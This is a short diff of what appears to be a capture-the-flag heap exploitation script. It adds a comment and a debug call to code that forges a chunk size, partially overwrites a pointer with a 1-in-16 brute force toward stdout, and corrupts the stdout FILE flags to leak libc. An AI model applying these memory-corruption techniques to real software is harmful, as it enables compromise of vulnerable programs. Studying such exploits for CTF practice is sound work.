@@ -51,7 +51,7 @@ def pwn():
     io = get_io()
     for i in range(11):
         add(io, i, 0x80)
-    edit(io, 0, b"%136c"+p64(0x511), "tt")
+    edit(io, 0, b"%136c"+p64(0x511), "tt")    #136=0x80+8 0x511 fake size
     delete(io, 1)
 
     
@@ -74,7 +74,7 @@ def pwn():
     add(io, 13, 0x30)  #两次malloc, 让unb中的指针后移到19节点，里面有main_arena偏移
     edit(io, 12, b"a"*0x50+p64(0x80), b"tt") # 改下一card的size
     edit(io, 13, b"100", b"t"*0x38+b"\x98\xb6") #最后2为改为“0xb690”,1/16概率中stdout, 0xb6a0,因为本题前8字节为size,所以-0x8
-
+    ddebug(io)
     add(io, 14, 0x80)  
     add(io, 15, 0x80)  
     edit(io, 15, b"128", p64(0xfbad1800) + p64(0)*3 + b"\x00")
